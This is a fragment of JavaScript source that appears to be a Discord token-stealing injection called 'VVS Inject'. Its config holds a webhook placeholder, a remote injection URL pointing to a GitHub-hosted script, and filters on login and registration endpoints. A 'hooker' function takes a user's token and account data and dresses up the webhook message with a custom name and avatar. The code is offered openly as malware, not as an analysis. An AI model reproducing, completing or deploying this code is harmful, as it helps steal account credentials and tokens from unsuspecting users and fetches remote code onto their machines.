...
const CONFIG = {
  webhook:
    "%WEBHOOK%",
  injection_url:
    "https://raw.githubusercontent.com/uh4a/iqduhqi/main/liugdqzioudgqiuzdhiqhzdyhgzqikldhgqiuygd.js",
  filters: {
    urls: [
      "/auth/login",
      "/auth/register",
...
const hooker = async (content, token, account) => {
  content["username"] = "VVS Inject";
  content["avatar_url"] = "https://avatars.githubusercontent.com/u/198399128?v=4";
